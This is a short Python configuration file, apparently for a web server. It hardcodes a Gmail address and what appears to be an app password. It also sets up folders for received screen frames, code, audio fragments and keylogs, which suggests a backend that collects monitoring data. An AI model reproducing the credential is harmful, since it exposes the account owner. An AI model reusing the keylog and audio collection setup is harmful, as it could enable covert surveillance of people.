import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    USER1 = os.getenv('USER1')
    JWT_SECRET = os.getenv('JWT_SECRET')
    MAIL_SERVER="smtp.gmail.com"
    MAIL_PORT=587
    MAIL_USERNAME="atsalagare123@gmail.com"
    MAIL_PASSWORD="yrox uoaw arau jnuy"

    # File upload configurations
    UPLOAD_FOLDER = 'assets/uploaded_files'
    FRAME_DIR = "assets/received_frames"
    CODE_DIR = "assets/received_codes"
    AUDIO_UPLOAD_FOLDER = "assets/uploaded_audio_fragments"
    KEYLOG_FOLDER = "assets/received_keylogs"
    for directory in [UPLOAD_FOLDER, FRAME_DIR, CODE_DIR, AUDIO_UPLOAD_FOLDER, KEYLOG_FOLDER]:
        os.makedirs(directory, exist_ok=True)
        
    MAX_CONTENT_LENGTH = 10 * 1024 * 1024  # 10 MB
    ALLOWED_EXTENSIONS = {'.txt', '.docx'}